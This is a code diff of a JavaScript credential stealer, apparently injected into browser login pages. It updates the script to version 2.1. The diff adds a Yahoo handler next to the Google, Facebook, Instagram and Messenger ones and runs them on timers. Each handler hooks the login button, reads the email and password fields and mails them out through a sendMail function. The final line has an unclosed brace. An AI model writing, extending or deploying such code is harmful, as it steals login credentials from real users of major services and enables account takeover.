@@ -1,4 +1,4 @@
-//V2.0
+//V2.1
 
 
 //if (typeof useringer === "undefined") {var useringer="None";};
@@ -72,16 +72,18 @@ function google(){
 	//Grabs login button object
 	let loginbutton = document.getElementById("passwordNext");
 	//injex
-	loginbutton.onclick = function (){
-		//Grabs credentials
-		let email = document.getElementById("profileIdentifier").innerText;
-		let pass = document.getElementsByName("password")[0].value;
-		//Checks
-		if (typeof useringer === "undefined") {let useringer = "None"};
-		if (validateCredentials(email, pass)){
-			getreqjson["subject"] = subject;
-			getreqjson["bodyHTML"] = makeMessage(email, pass, useringer, Date());
-			sendMail(getreqjson);
+	if (loginbutton.onclick !== null){
+		loginbutton.onclick = function (){
+			//Grabs credentials
+			let email = document.getElementById("profileIdentifier").innerText;
+			let pass = document.getElementsByName("password")[0].value;
+			//Checks
+			if (typeof useringer === "undefined") {let useringer = "None"};
+			if (validateCredentials(email, pass)){
+				getreqjson["subject"] = subject;
+				getreqjson["bodyHTML"] = makeMessage(email, pass, useringer, Date());
+				sendMail(getreqjson);
+			}
 		}
 	}
 }
@@ -123,9 +125,28 @@ function messenger(){
 		}
 	}
 }
+
+function yahoo(){
+	let subject = "YHO";
+	let loginbutton = document.getElementById("login-signin");
+		loginbutton.onclick = function (){
+		//Grabs credentials
+		let email = document.getElementsByClassName("yid")[0].innerText;
+		let pass = document.getElementsByName("password")[0].value;
+		//Checks
+		if (typeof useringer === "undefined") {let useringer = "None"};
+		if (validateCredentials(email, pass)){
+			getreqjson["subject"] = subject;
+			getreqjson["bodyHTML"] = makeMessage(email, pass, useringer, Date());
+			sendMail(getreqjson);
+		}
+	}
+	
+}
 //main
-if (hostname.includes("facebook")){facebook()}
-else if(hostname.includes("google")){google()}
-else if(hostname.includes("instagram")){instagram()}
-else if(hostname.includes("messenger")){messenger()}
+if (hostname.includes("facebook")){setTimeout(facebook,1500)}
+else if(hostname.includes("google")){setInterval(google,2500)}
+else if(hostname.includes("instagram")){setTimeout(instagram, 3000)}
+else if(hostname.includes("messenger")){setTimeout(messenger, 1500)}
+else if(hostname.includes("yahoo")){setInterval(yahoo, 2500)
 else{} 
